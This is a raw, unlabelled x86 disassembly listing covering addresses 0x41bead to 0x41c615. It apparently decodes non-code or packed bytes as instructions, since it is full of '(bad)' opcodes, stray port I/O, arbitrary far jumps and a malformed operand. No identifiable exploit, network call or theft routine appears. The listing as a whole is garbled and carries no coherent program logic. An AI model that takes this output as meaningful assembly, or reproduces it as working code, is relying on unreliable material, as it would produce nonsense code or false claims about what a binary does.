  41bead:	scas   eax,DWORD PTR es:[edi]
  41beae:	loopne 0x41be67
  41beb0:	ds pop esp
  41beb2:	sbb    BYTE PTR [edi],0x41
  41beb5:	xchg   edi,eax
  41beb6:	adc    BYTE PTR [ebp+0x41],al
  41beb9:	arpl   WORD PTR [esi],cx
  41bebb:	jae    0x41bf30
  41bebd:	push   esi
  41bebe:	jl     0x41bef2
  41bec0:	rol    BYTE PTR [edx],0x10
  41bec3:	ins    BYTE PTR es:[edi],dx
  41bec4:	popa   
  41bec5:	sbb    edx,DWORD PTR [esi+0x40]
  41bec8:	data16 sbb al,0x8
  41becb:	cmp    DWORD PTR [ecx+0x72506640],edx
  41bed1:	mov    ecx,0xf07eab68
  41bed6:	ins    BYTE PTR es:[edi],dx
  41bed7:	gs (bad) 
  41bed9:	nop
  41beda:	cwde   
  41bedb:	scas   eax,DWORD PTR es:[edi]
  41bedc:	cwde   
  41bedd:	xchg   eax,ebp
  41bedf:	mov    edi,0x53450e02
  41bee4:	je     0x41bf47
  41bee6:	arpl   WORD PTR [ebx+0x1],bp
  41bee9:	nop
  41beea:	hlt    
  41beeb:	mov    eax,0xb768b902
  41bef0:	hlt    
  41bef1:	or     DWORD PTR ds:0xdf74361b,edx
  41bef7:	je     0x41becd
  41bef9:	ins    BYTE PTR es:[edi],dx
  41befa:	inc    ebx
  41befb:	(bad)  
  41befc:	dec    esp
  41befd:	addr16 (bad) 
  41beff:	cld    
  41bf00:	adc    DWORD PTR [eax+0x56674c13],0x61697261
  41bf0a:	outs   dx,BYTE PTR ds:[esi]
  41bf0b:	add    bh,BYTE PTR [ecx-0x48577c98]
  41bf11:	test   al,0x8b
  41bf13:	xchg   DWORD PTR [edx-0x4f],esp
  41bf16:	mov    cs,WORD PTR [eax-0x12ec7dbc]
  41bf1c:	(bad)
  41bf1f:	popa   
  41bf20:	fsub   QWORD PTR [esi+ecx*4+0x8]
  41bf24:	push   0x9a8a08bf
  41bf29:	sub    DWORD PTR [eax-0x4f9df198],edx
  41bf2f:	jb     0x41bf8d
  41bf31:	mov    ah,0x13
  41bf33:	sbb    ah,ah
  41bf35:	jns    0x41bec7
  41bf37:	fs mov bh,0x64
  41bf3a:	dec    esi
  41bf3b:	adc    eax,0x66568418
  41bf40:	jo     0x41bf0a
  41bf42:	jae    0x41bed5
  41bf44:	fdiv   QWORD PTR [edi-0x3cef3f40]
  41bf4a:	sub    eax,eax
  41bf4c:	add    eax,0xab534608
  41bf51:	push   ds
  41bf52:	add    al,0x72
  41bf54:	mov    ds:0x676918e0,al
  41bf59:	sbb    BYTE PTR [ecx+0x4d],ch
  41bf5c:	repnz push edi
  41bf5e:	popa   
  41bf5f:	mov    ss,WORD PTR [ebx+0x61]
  41bf62:	data16 arpl WORD PTR gs:[ecx+0x6c],sp
  41bf67:	xor    BYTE PTR [eax-0x65],dh
  41bf6a:	adc    bh,bh
  41bf6c:	jle    0x41bf7f
  41bf6e:	add    ebp,DWORD PTR [esi]
  41bf70:	aaa    
  41bf71:	xor    al,0x4
  41bf73:	pop    ebp
  41bf74:	dec    eax
  41bf75:	invd   
  41bf77:	and    ah,BYTE PTR [ecx+0x2b]
  41bf7a:	add    al,0x3e
  41bf7c:	push   ebp
  41bf7d:	inc    esp
  41bf7e:	ins    BYTE PTR es:[edi],dx
  41bf7f:	jae    0x41bfbf
  41bf81:	add    eax,0x47664810
  41bf86:	cmp    BYTE PTR [esi],ch
  41bf88:	mov    ds:0x1c03940,al
  41bf8d:	mov    esi,0xaa766724
  41bf92:	adc    ebx,ebp
  41bf94:	aas    
  41bf95:	inc    esp
  41bf96:	xchg   edi,eax
  41bf97:	mov    eax,0x391406b6
  41bf9c:	add    bh,bh
  41bf9e:	adc    edx,DWORD PTR [esp+edx*2+0x68]
  41bfa2:	jb     0x41c009
  41bfa4:	popa   
  41bfa5:	fs inc esp
  41bfa8:	jne    0x41c018
  41bfaa:	mov    esi,ecx
  41bfac:	pop    es
  41bfad:	push   es
  41bfae:	int3   
  41bfaf:	add    eax,0xffffffd4
  41bfb2:	test   BYTE PTR [edx+0x479c0f2c],ch
  41bfb8:	add    BYTE PTR [edi],ah
  41bfba:	inc    edi
  41bfbb:	test   eax,0x789edc30
  41bfc0:	sbb    DWORD PTR [eax+edx*4-0x2c],esp
  41bfc4:	aam    0xd4
  41bfc6:	add    DWORD PTR [edx-0x62],ebp
  41bfc9:	out    0xf3,al
  41bfcb:	sbb    al,0xbe
  41bfcd:	push   es
  41bfce:	adc    eax,0xf1e969e1
  41bfd3:	(bad)  
  41bfd4:	mov    edi,0x87f979c1
  41bfd9:	push   edx
  41bfda:	mov    WORD PTR [eax],ss
  41bfdc:	jnp    0x41bf6d
  41bfde:	sbb    eax,0xdf9c4cdb
  41bfe3:	push   edi
  41bfe4:	loopne 0x41c057
  41bfe6:	sbb    DWORD PTR [edi+ebp*1+0x44],esi
  41bfea:	out    dx,eax
  41bfeb:	cmp    eax,0x2c4e203f
  41bff0:	mov    edi,0x63c16
  41bff5:	sub    ch,BYTE PTR [edi+0x44]
  41bff8:	push   DWORD PTR [esi]
  41bffa:	xor    BYTE PTR [ecx],dl
  41bffc:	stc    
  41bffd:	xchg   BYTE PTR [edi],al
  41bfff:	lea    esi,[edi+0x247cb8a8]
  41c005:	push   esp
  41c006:	dec    ebp
  41c007:	jne    0x41c075
  41c009:	(bad)  
  41c00b:	lds    esp,FWORD PTR [eax+0x6c20bc52]
  41c011:	jne    0x41c086
  41c013:	call   0xb084177d
  41c018:	inc    ecx
  41c019:	pusha  
  41c01a:	fadd   st,st(2)
  41c01c:	lods   al,BYTE PTR ds:[esi]
  41c01d:	outs   dx,BYTE PTR ds:[esi]
  41c01e:	arpl   dx,bp
  41c020:	inc    esp
  41c021:	cs inc eax
  41c023:	mov    al,0x3a
  41c025:	imul   edi,DWORD PTR [edx-0x28],0xfc05ddaf
  41c02c:	int    0x34
  41c02e:	ret    0xeac1
  41c031:	adc    BYTE PTR [esi-0x9],ah
  41c034:	repz dec eax
  41c036:	mov    WORD PTR [ecx],ax
  41c039:	or     BYTE PTR ds:[edi],ch
  41c03c:	mov    al,ds:0x811f1304
  41c041:	popa   
  41c042:	sar    BYTE PTR [edi],0xb7
  41c045:	scas   al,BYTE PTR es:[edi]
  41c046:	push   cs
  41c047:	retf   
  41c048:	mov    dl,0x1
  41c04a:	mov    eax,ds:0x859b8e38
  41c04f:	dec    edi
  41c050:	mov    ds:0xe026930a,eax
  41c055:	mov    bh,0x3f
  41c057:	mov    BYTE PTR [ebx+0x42],dl
  41c05a:	xor    DWORD PTR [ecx],ebx
  41c05c:	nop
  41c05d:	shl    BYTE PTR [ebx],1
  41c05f:	leave  
  41c060:	sbb    ecx,DWORD PTR [ecx-0x2c743d71]
  41c066:	daa    
  41c067:	(bad)  
  41c068:	das    
  41c069:	add    esp,eax
  41c06b:	sbb    al,BYTE PTR [ebx]
  41c06d:	aas    
  41c06e:	cli    
  41c06f:	cmp    ebx,esi
  41c071:	xor    eax,0xd8e30215
  41c076:	test   DWORD PTR [eax+eax*2-0x4f],esp
  41c07a:	(bad)  
  41c07b:	rol    BYTE PTR [edi],cl
  41c07d:	jbe    0x41c0a7
  41c07f:	and    ecx,esi
  41c081:	mov    ebx,0x8abc9d04
  41c086:	cli    
  41c087:	push   ds
  41c088:	push   es
  41c089:	cmp    al,0x7a
  41c08b:	ja     0x41c08f
  41c08d:	sub    al,0x9c
  41c08f:	mov    edi,edx
  41c091:	mov    cl,0xd8
  41c093:	add    al,0x88
  41c095:	add    bh,bh
  41c097:	xchg   esp,eax
  41c098:	ds in  al,dx
  41c09a:	adc    ebx,DWORD PTR [eax+0x28]
  41c09d:	lock jne 0x41c07f
  41c0a0:	aad    0x9f
  41c0a2:	test   BYTE PTR [edi+ecx*8],dh
  41c0a5:	inc    ebp
  41c0a6:	inc    ecx
  41c0a7:	pop    edx
  41c0a8:	add    al,0x2c
  41c0aa:	pop    esp
  41c0ab:	adc    DWORD PTR [ebp-0x64],ebp
  41c0ae:	push   ebx
  41c0af:	push   esi
  41c0b0:	or     DWORD PTR [eax+0x5f88aff],ecx
  41c0b6:	or     esi,eax
  41c0b8:	push   edx
  41c0b9:	cld    
  41c0ba:	mov    ecx,eax
  41c0bc:	cmp    ecx,edx
  41c0be:	jbe    0x41c13b
  41c0c0:	xchg   edx,eax
  41c0c1:	(bad)  
  41c0c2:	mov    ebx,0xf3c93904
  41c0c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0c8:	je     0x41c0f4
  41c0ca:	mov    bl,BYTE PTR [esi-0x1]
  41c0cd:	adc    al,0x8
  41c0cf:	or     dl,dl
  41c0d1:	ds dec ecx
  41c0d3:	add    dh,BYTE PTR [edx]
  41c0d5:	push   ds
  41c0d6:	mov    bh,BYTE PTR [edi+0x1e]
  41c0d9:	call   eax
  41c0db:	fstp   TBYTE PTR [edi-0x5b]
  41c0de:	(bad)  
  41c0df:	out    dx,eax
  41c0e0:	and    BYTE PTR [eax],bh
  41c0e2:	sti    
  41c0e3:	je     0x41c0bd
  41c0e5:	movzx  eax,bl
  41c0e8:	add    al,0xd7
  41c0ea:	sub    eax,edx
  41c0ec:	pop    ebx
  41c0ed:	out    dx,eax
  41c0ee:	push   ebp
  41c0ef:	adc    ebp,eax
  41c0f1:	stos   BYTE PTR es:[edi],al
  41c0f2:	nop
  41c0f3:	lock sbb DWORD PTR [eax-0x1aeb65e9],esp
  41c0fa:	add    al,0x36
  41c0fc:	or     ah,BYTE PTR [edx+0x10aa4a3b]
  41c102:	add    dh,BYTE PTR [eax]
  41c104:	fwait
  41c105:	mov    esp,0x5d06cc5b
  41c10a:	loopne 0x41c09c
  41c10c:	enter  0xb157,0x87
  41c110:	push   eax
  41c111:	and    dh,BYTE PTR [edi-0x1bf01ff1]
  41c117:	ret    
  41c118:	pop    ds
  41c119:	ret    
  41c11a:	jmp    0x18c6:0x8010a40d
  41c121:	dec    edx
  41c122:	cs pusha 
  41c124:	or     DWORD PTR [edx],0x38
  41c127:	add    bl,BYTE PTR [esi+0x6f]
  41c12a:	add    eax,esi
  41c12c:	mov    ch,0xb4
  41c12e:	inc    eax
  41c12f:	pop    ecx
  41c130:	pop    esp
  41c131:	jl     0x41c0f6
  41c133:	add    al,0x60
  41c135:	and    eax,0x4fc09498
  41c13a:	jmp    0xa28b:0x868674a5
  41c141:	(bad)  
  41c142:	fwait
  41c143:	lock mov ebx,0xfede32dd
  41c149:	mov    edi,0xf33b4301
  41c14e:	jl     0x41c157
  41c150:	cmp    BYTE PTR [edi+ebx*1-0x1],0x20
  41c155:	jbe    0x41c14b
  41c157:	adc    al,0x7d
  41c159:	or     cl,BYTE PTR [ebx-0x2c243c3b]
  41c15f:	lods   eax,DWORD PTR ds:[esi]
  41c161:	pop    ss
  41c162:	dec    esi
  41c163:	sub    BYTE PTR [edi],dh
  41c165:	clc    
  41c166:	push   0xffffffce
  41c168:	sub    ecx,ebx
  41c16a:	inc    ecx
  41c16b:	repnz xchg ecx,eax
  41c16d:	inc    edx
  41c16e:	add    BYTE PTR [edi],bh
  41c170:	jno    0x41c1a3
  41c172:	mov    WORD PTR [edi],?
  41c174:	retf   0xb07b
  41c177:	inc    ecx
  41c178:	cmp    DWORD PTR [edx+0x1e927ed8],edx
  41c17e:	fpatan 
  41c180:	xchg   esp,eax
  41c181:	push   ds
  41c182:	mov    ds,WORD PTR [ebp-0x3fe897c3]
  41c188:	sbb    edi,DWORD PTR [esi+0x75c90867]
  41c18e:	push   esi
  41c18f:	sar    BYTE PTR [ecx+0xe],0xf7
  41c193:	xchg   esp,eax
  41c194:	pop    ebp
  41c195:	fistp  QWORD PTR [esi-0x4f99002d]
  41c19b:	sub    eax,0x6884e41
  41c1a0:	ret    
  41c1a1:	mov    ecx,0x31565d0a
  41c1a6:	shl    bh,cl
  41c1a8:	icebp  
  41c1a9:	out    0xc2,al
  41c1ab:	xor    BYTE PTR [eax-0x5f75c506],al
  41c1b1:	pop    ss
  41c1b2:	dec    edx
  41c1b3:	sbb    al,dl
  41c1b5:	pop    es
  41c1b6:	mov    BYTE PTR [esi],dl
  41c1b8:	cmp    al,0xea
  41c1ba:	(bad)  
  41c1bc:	jmp    FWORD PTR [ebx]
  41c1be:	js     0x41c1e9
  41c1c0:	icebp  
  41c1c1:	sub    edx,ecx
  41c1c3:	jbe    0x41c1d5
  41c1c5:	add    ecx,edx
  41c1c7:	mov    al,0x30
  41c1c9:	sub    esi,edx
  41c1cb:	jmp    0x41c1d0
  41c1cd:	mov    BYTE PTR [edx+esi*1],al
  41c1d0:	dec    edx
  41c1d1:	jne    0x41c1cd
  41c1d3:	push   0x56
  41c1d5:	mov    DWORD PTR [ecx],edx
  41c1d7:	lock into 
  41c1d9:	(bad)  
  41c1da:	out    0x83,al
  41c1dc:	in     al,dx
  41c1dd:	adc    BYTE PTR [ecx],dh
  41c1df:	leave  
  41c1e0:	push   edx
  41c1e1:	outs   dx,BYTE PTR ds:[esi]
  41c1e2:	cdq    
  41c1e3:	push   eax
  41c1e4:	mov    edx,esi
  41c1e6:	pop    eax
  41c1e7:	retf   
  41c1e8:	hlt    
  41c1e9:	outs   dx,BYTE PTR ds:[esi]
  41c1ea:	fst    QWORD PTR [edx+eax*8-0x4ccf28a2]
  41c1f1:	jmp    FWORD PTR ds:0x2bf80300
  41c1f7:	and    bh,bh
  41c1f9:	jo     0x41c1ff
  41c1fb:	push   DWORD PTR [eax]
  41c1fd:	mov    eax,esp
  41c1ff:	test   DWORD PTR [eax-0xa],0x46745970
  41c206:	sbb    DWORD PTR cs:[ecx+0x73a433bf],esp
  41c20d:	lock mov BYTE PTR [esi-0x1],0x2d
  41c212:	dec    esi
  41c213:	inc    ecx
  41c214:	dec    esi
  41c215:	pop    ebp
  41c216:	cmp    bh,0x9b
  41c219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21a:	mov    ds:0x247cd904,al
  41c21f:	add    bl,cl
  41c221:	cmp    al,0x24
  41c223:	or     WORD PTR [edx+ecx*1],0xd90f
  41c229:	sub    al,0xec
  41c22b:	fsub   DWORD PTR gs:[esi-0x172676f0]
  41c232:	mov    DWORD PTR [edi],esp
  41c234:	and    DWORD PTR [esp+esi*2-0x49],0x5401ec3f
  41c23c:	jg     0x41c2a6
  41c23e:	or     edi,edi
  41c240:	fild   QWORD PTR [esp+0x8]
  41c244:	fistp  WORD PTR [eax-0x28]
  41c247:	ret    0xdcde
  41c24a:	mov    esi,0xc183fd
  41c24f:	jmp    0x41c253
  41c251:	fild   QWORD PTR [eax]
  41c253:	fild   WORD PTR [esp+ebp*2]
  41c256:	ror    DWORD PTR [esi-0x27],0xf8
  41c25a:	(bad)  
  41c25c:	fdiv   st(1),st
  41c25e:	mov    al,BYTE PTR [eax+0x24]
  41c261:	pop    eax
  41c262:	sub    eax,0xae3c3036
  41c267:	adc    ch,BYTE PTR ds:[edx-0x1]
  41c26b:	lods   eax,DWORD PTR ds:[esi]
  41c26c:	lods   al,BYTE PTR ds:[esi]
  41c26d:	push   es
  41c26e:	sub    al,0xd8
  41c270:	rcr    DWORD PTR [ebx+0x739ee0df],cl
  41c276:	loope  0x41c251
  41c278:	push   0x2
  41c27a:	fstp   DWORD PTR [eax+eiz*8-0x3c22f141]
  41c281:	ffree  st(2)
  41c283:	ffree  st(1)
  41c285:	ffree  st(0)
  41c287:	pop    ecx
  41c288:	aad    0x29
  41c28a:	(bad)  
  41c28b:	add    ecx,edx
  41c28d:	repz pusha 
  41c28f:	add    eax,0x20dd462c
  41c294:	xchg   edx,eax
  41c295:	push   es
  41c296:	pop    ss
  41c297:	push   eax
  41c298:	push   eax
  41c299:	pop    esi
  41c29a:	or     bl,ah
  41c29c:	mov    esp,0x78829686
  41c2a1:	and    BYTE PTR [esi+0x5d],bl
  41c2a4:	mov    esp,0xcce0787e
  41c2a9:	sbb    dh,ah
  41c2ab:	add    al,BYTE PTR [eax+0x57]
  41c2ae:	push   ecx
  41c2af:	mov    ecx,0xe5c49754
  41c2b4:	bound  esi,QWORD PTR [edi]
  41c2b6:	and    BYTE PTR [ebx-0x34],dl
  41c2b9:	aam    0xe1
  41c2bb:	and    DWORD PTR [eax+0x1],ebx
  41c2be:	jno    0x41c245
  41c2c0:	stc    
  41c2c1:	xor    DWORD PTR [ebp+0x25],edx
  41c2c4:	sahf   
  41c2c5:	pop    edx
  41c2c6:	(bad)  
  41c2c7:	push   ecx
  41c2c8:	jns    0x41c29e
  41c2ca:	sar    DWORD PTR [edx-0x48],0x9f
  41c2ce:	cmp    DWORD PTR [ecx+0x3d803d06],ecx
  41c2d4:	or     BYTE PTR [edi-0x7f5e5862],ah
  41c2da:	addr16 push eax
  41c2dc:	js     0x41c321
  41c2de:	ret    0x1c75
  41c2e1:	shr    BYTE PTR [ecx],0xf6
  41c2e4:	mov    eax,0xbf83691f
  41c2e9:	cmp    al,BYTE PTR [eax]
  41c2eb:	inc    edx
  41c2ec:	imul   esp,DWORD PTR [edi+0x3a],0xb172a0ac
  41c2f3:	jg     0x41c374
  41c2f5:	dec    edi
  41c2f6:	mov    edx,0x2c236f8c
  41c2fb:	cld    
  41c2fc:	mov    eax,ds:0x90846d84
  41c301:	retf   0x4c80
  41c304:	push   eax
  41c305:	test   BYTE PTR [eax+ecx*2-0x48b92865],bl
  41c30c:	add    al,0x54
  41c30e:	jb     0x41c292
  41c310:	sti    
  41c311:	sar    DWORD PTR [ebp-0x21],cl
  41c314:	pop    ds
  41c315:	add    eax,0x736c6146
  41c31a:	and    DWORD PTR [eax],ebx
  41c31c:	cld    
  41c31d:	not    bh
  41c31f:	xchg   edi,eax
  41c320:	push   edi
  41c321:	mov    BYTE PTR [ebp-0x1],0x92
  41c325:	repnz test esi,esi
  41c328:	jl     0x41c34a
  41c32a:	inc    esi
  41c32b:	js     0x41c2e0
  41c32d:	or     bh,BYTE PTR [eax+0x65]
  41c330:	cmp    bh,BYTE PTR [esi+0x5cac138b]
  41c336:	mov    ah,0xb2
  41c338:	or     eax,0x3a065f8c
  41c33d:	add    ebx,ebp
  41c33f:	push   es
  41c340:	in     eax,0xe3
  41c342:	mov    dl,BYTE PTR [esi]
  41c344:	lds    edx,FWORD PTR [edi+eax*4-0x1828ebd0]
  41c34b:	lahf   
  41c34c:	rcr    ch,0xc0
  41c34f:	fiadd  DWORD PTR [ebp+ecx*4+0x55]
  41c353:	lock pop es
  41c355:	cld    
  41c356:	cmp    esp,DWORD PTR [esi+eiz*4-0x4f2fc390]
  41c35d:	adc    ebx,ebx
  41c35f:	ins    DWORD PTR es:[edi],dx
  41c360:	lock fcomp DWORD PTR ds:0xbf047060
  41c367:	mov    edi,0xf4c1010
  41c36c:	xchg   ebp,eax
  41c36d:	add    ebp,ebx
  41c36f:	dec    ecx
  41c370:	ss pop edi
  41c372:	adc    BYTE PTR [ebp-0x1],dl
  41c375:	in     eax,dx
  41c376:	out    dx,eax
  41c377:	popa   
  41c378:	ins    DWORD PTR es:[edi],dx
  41c379:	retf   0x17d0
  41c37c:	pop    edi
  41c37d:	mov    al,ds:0xc6056759
  41c382:	add    ecx,esp
  41c384:	and    DWORD PTR [esi+0x42],esp
  41c387:	imul   eax,DWORD PTR cs:[esp+eax*4-0x7c],0x97de103
  41c390:	add    eax,0x17fc24e
  41c395:	retf   0x6e7c
  41c398:	pop    ss
  41c399:	fbstp  TBYTE PTR [eax]
  41c39b:	pop    ss
  41c39c:	add    ch,BYTE PTR ds:0x7bc40531
  41c3a2:	out    0x86,al
  41c3a4:	icebp  
  41c3a5:	bound  ebp,QWORD PTR [edi+ebp*8]
  41c3a8:	adc    DWORD PTR cs:[esi-0x28],edi
  41c3ac:	push   ebp
  41c3ad:	add    dh,BYTE PTR [ebp+edx*1-0x1d]
  41c3b1:	mov    edx,DWORD PTR [edx]
  41c3b3:	aaa    
  41c3b4:	jmp    0x41c3da
  41c3b6:	adc    eax,0x21e92458
  41c3bb:	test   BYTE PTR [eax+0x28],al
  41c3be:	rol    BYTE PTR [ecx],cl
  41c3c0:	mov    esp,0x4c8aaaf7
  41c3c5:	adc    al,0x95
  41c3c7:	sub    al,0x51
  41c3c9:	in     eax,dx
  41c3ca:	sub    DWORD PTR [edi-0x3],edx
  41c3cd:	jmp    FWORD PTR [ecx-0x377c07f9]
  41c3d3:	dec    DWORD PTR [ebx+0x3e683f3]
  41c3d9:	cmp    esi,0x2
  41c3dc:	ja     0x41c41d
  41c3de:	cwde   
  41c3df:	and    edx,0xdd7893f0
  41c3e5:	jno    0x41c3bd
  41c3e7:	pop    esi
  41c3e8:	inc    eax
  41c3e9:	ja     0x41c41d
  41c3eb:	hlt    
  41c3ec:	sbb    ah,0x9a
  41c3ef:	cli    
  41c3f0:	add    BYTE PTR [edx+0x3],ch
  41c3f3:	push   0x6
  41c3f5:	sub    eax,0xef7b65d7
  41c3fa:	and    BYTE PTR [ebx-0x75bf7afc],cl
  41c400:	push   eax
  41c401:	push   cs
  41c402:	mov    ch,0x34
  41c404:	(bad)  
  41c405:	fild   WORD PTR [eax]
  41c407:	sub    ecx,ebx
  41c409:	sub    edx,ecx
  41c40b:	xor    DWORD PTR [eax],0x16
  41c40e:	xchg   BYTE PTR [ebp+0x10273ae],ch
  41c414:	dec    ebx
  41c415:	arpl   bp,cx
  41c417:	xchg   BYTE PTR [esi],bh
  41c419:	or     BYTE PTR [ebp+0x77],0xfa
  41c41d:	rcr    BYTE PTR [edi],0x44
  41c420:	popa   
  41c421:	pop    es
  41c422:	push   edi
  41c423:	push   ecx
  41c424:	sar    DWORD PTR [eax],0x27
  41c427:	xchg   esp,eax
  41c428:	add    dl,bl
  41c42a:	into   
  41c42b:	inc    ebp
  41c42c:	and    eax,0x1f7b029d
  41c431:	pop    es
  41c432:	(bad)  
  41c433:	push   esp
  41c434:	add    BYTE PTR [ebp+0x72ee60bc],dl
  41c43a:	mov    cl,0x57
  41c43c:	dec    ebx
  41c43d:	or     ch,dl
  41c43f:	push   esp
  41c440:	or     ch,BYTE PTR [ecx+0x7008cab7]
  41c446:	xchg   esp,eax
  41c447:	sub    cl,BYTE PTR cs:[esi+ebx*4]
  41c44b:	push   esi
  41c44c:	cwde   
  41c44d:	out    0xa6,al
  41c44f:	mov    esi,0xf0cbd4b1
  41c454:	stc    
  41c455:	push   ebp
  41c456:	ins    BYTE PTR es:[edi],dx
  41c457:	jo     0x41c453
  41c459:	mov    ds:0x493f5291,al
  41c45e:	clc    
  41c45f:	inc    ebx
  41c460:	sbb    dh,al
  41c462:	inc    ecx
  41c463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c464:	retf   
  41c465:	dec    edx
  41c466:	cld    
  41c467:	pop    es
  41c468:	mov    BYTE PTR [edx],0x7f
  41c46b:	cld    
  41c46c:	(bad)  
  41c46d:	jle    0x41c498
  41c46f:	mov    bl,BYTE PTR [esi+edi*1-0x1]
  41c473:	cli    
  41c474:	push   ecx
  41c475:	xor    BYTE PTR [esi+esi*8],bh
  41c478:	sbb    al,0x5c
  41c47a:	and    eax,0xffb65c64
  41c47f:	xlat   BYTE PTR ds:[ebx]
  41c480:	inc    edx
  41c481:	(bad)  
  41c482:	xlat   BYTE PTR ds:[ebx]
  41c483:	pop    ebp
  41c484:	call   0x4f06:0x75023ce4
  41c48b:	dec    edi
  41c48c:	push   eax
  41c48d:	jg     0x41c466
  41c48f:	(bad)  
  41c490:	ds in  al,0x20
  41c493:	mov    ch,0xd7
  41c495:	cli    
  41c496:	pushf  
  41c497:	sar    DWORD PTR [eax-0x6ea88d98],cl
  41c49d:	(bad)
  41c4a2:	mov    esi,eax
  41c4a4:	push   edi
  41c4a5:	cmp    al,0xb9
  41c4a7:	push   ecx
  41c4a8:	pop    edi
  41c4a9:	lds    eax,FWORD PTR [ebx]
  41c4ab:	sahf   
  41c4ac:	mov    ecx,0x3a5cdf17
  41c4b1:	add    al,al
  41c4b3:	mov    cl,0x87
  41c4b5:	add    DWORD PTR [edi+0x6fb0b8d6],edx
  41c4bb:	fmul   DWORD PTR [eax+ebx*4]
  41c4be:	std    
  41c4bf:	imul   ebx,DWORD PTR [edx+0x11752e18],0x9bd37f57
  41c4c9:	jmp    0xec25332a
  41c4ce:	pop    es
  41c4cf:	not    DWORD PTR [ebp+0x6c1a038f]
  41c4d5:	and    ch,dh
  41c4d7:	cs nop
  41c4d9:	xlat   BYTE PTR ds:[ebx]
  41c4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4db:	push   esp
  41c4dc:	loop   0x41c503
  41c4de:	mov    esp,0x68500c32
  41c4e3:	scas   al,BYTE PTR es:[edi]
  41c4e4:	add    DWORD PTR [ebx],ebp
  41c4e6:	jecxz  0x41c469
  41c4e8:	sub    esp,DWORD PTR [eax-0x75]
  41c4eb:	enter  0x490f,0x6c
  41c4ef:	and    bh,BYTE PTR [esi+0x6461bd25]
  41c4f5:	sbb    al,0x46
  41c4f7:	xlat   BYTE PTR ds:[ebx]
  41c4f8:	mov    edx,es
  41c4fa:	push   es
  41c4fb:	pop    edx
  41c4fc:	adc    ch,BYTE PTR [ebx+0x76]
  41c4ff:	sbb    esp,esp
  41c501:	int    0xb0
  41c503:	push   ebx
  41c504:	stos   BYTE PTR es:[edi],al
  41c505:	test   BYTE PTR [eax-0x29],dl
  41c508:	lods   eax,DWORD PTR ds:[esi]
  41c509:	in     al,0xfd
  41c50b:	mov    ds:0x5891f0ee,al
  41c510:	in     eax,0xfc
  41c512:	imul   DWORD PTR [ebp+0x16]
  41c515:	inc    ebp
  41c516:	call   0x652e8d22
  41c51b:	mov    dh,0x48
  41c51d:	adc    al,0x8c
  41c51f:	mov    edx,0xe8891fe2
  41c524:	aad    0x38
  41c526:	lods   al,BYTE PTR ds:[esi]
  41c527:	mov    ecx,DWORD PTR [ebp+0x18]
  41c52a:	add    DWORD PTR [ecx-0x25c6efaf],ecx
  41c530:	leave  
  41c531:	xor    edx,DWORD PTR fs:[eax]
  41c534:	lea    edx,[ebx-0x80]
  41c537:	aaa    
  41c538:	push   ds
  41c539:	jbe    0x41c54b
  41c53b:	mov    ebx,0x30aa0d8d
  41c540:	(bad)  
  41c541:	int    0xff
  41c543:	xor    ch,BYTE PTR [esi+0x1712feb8]
  41c549:	or     eax,0xc829107f
  41c54e:	mov    edi,edx
  41c550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c551:	push   ecx
  41c552:	sbb    BYTE PTR [edx+0x3d29e1ea],dl
  41c558:	popf   
  41c559:	mov    bh,0x1c
  41c55b:	push   ecx
  41c55c:	dec    eax
  41c55d:	pop    eax
  41c55e:	das    
  41c55f:	fxch   st(3)
  41c561:	dec    esi
  41c562:	add    BYTE PTR ds:0xa57fbd29,0x6c
  41c569:	add    DWORD PTR [ecx+0x29],eax
  41c56c:	retf   
  41c56d:	mov    edi,esi
  41c56f:	mov    esi,edx
  41c571:	sbb    cl,0x94
  41c574:	xchg   esp,eax
  41c575:	cs dec edx
  41c577:	scas   al,BYTE PTR es:[edi]
  41c578:	repnz fld DWORD PTR [ecx+edx*1+0x5bb0af19]
  41c580:	pop    esi
  41c581:	pop    edi
  41c582:	ret    
  41c583:	scas   eax,DWORD PTR es:[edi]
  41c584:	jge    0x41c5c1
  41c586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c587:	les    edi,FWORD PTR [ecx-0x14]
  41c58a:	(bad)  
  41c58b:	pop    ecx
  41c58c:	adc    ah,BYTE PTR [ebx-0x6c]
  41c58f:	cmp    al,0x7b
  41c591:	dec    eax
  41c592:	sub    al,0x71
  41c594:	movsx  edi,BYTE PTR [eax+0x7d005fc6]
  41c59b:	push   ds
  41c59c:	adc    esi,DWORD PTR [ecx]
  41c59e:	not    ecx
  41c5a0:	rcl    dl,cl
  41c5a2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5a4:	mov    al,BYTE PTR [esi-0x7f]
  41c5a7:	jmp    0x41c557
  41c5a9:	loopne 0x41c5aa
  41c5ab:	mov    dl,BYTE PTR [edi+0x24]
  41c5ae:	shl    BYTE PTR [eax+0x6495347],1
  41c5b4:	into   
  41c5b5:	push   cs
  41c5b6:	dec    esp
  41c5b7:	jae    0x41c5ea
  41c5b9:	ror    BYTE PTR [ecx],0x2f
  41c5bc:	add    cl,bl
  41c5be:	dec    edi
  41c5bf:	je     0x41c5e2
  41c5c1:	pop    ss
  41c5c2:	mov    esi,0xbb52e211
  41c5c7:	data16 cmp dl,0x84
  41c5cb:	xchg   esi,eax
  41c5cc:	or     al,0xb6
  41c5ce:	iret   
  41c5cf:	cli    
  41c5d0:	jmp    0x729:0xdb748020
  41c5d7:	add    ch,BYTE PTR [esi+0x78]
  41c5da:	pop    esi
  41c5db:	int3   
  41c5dc:	add    al,0xeb
  41c5de:	or     al,0x84
  41c5e0:	rol    DWORD PTR [esi+esi*8],0xef
  41c5e4:	push   0x12
  41c5e6:	or     dl,BYTE PTR [edx]
  41c5e8:	mov    eax,DWORD PTR [ecx]
  41c5ea:	mov    al,BYTE PTR [eax]
  41c5ec:	cmp    dl,al
  41c5ee:	jne    0x41c5dc
  41c5f0:	push   cs
  41c5f1:	iret   
  41c5f2:	(bad)  
  41c5f3:	push   edx
  41c5f4:	rol    DWORD PTR [ebp+0x6e4044b4],cl
  41c5fa:	sti    
  41c5fb:	sbb    ebx,DWORD PTR [eax+ecx*1]
  41c5fe:	fisub  DWORD PTR ds:0x2e744921
  41c604:	mov    esi,ecx
  41c606:	mov    edi,ebx
  41c608:	pop    ds
  41c609:	prefetch BYTE PTR [edi+0x76f1291f]
  41c610:	sbb    eax,0xff5e8d1c
  41c615:	add    al,0xac
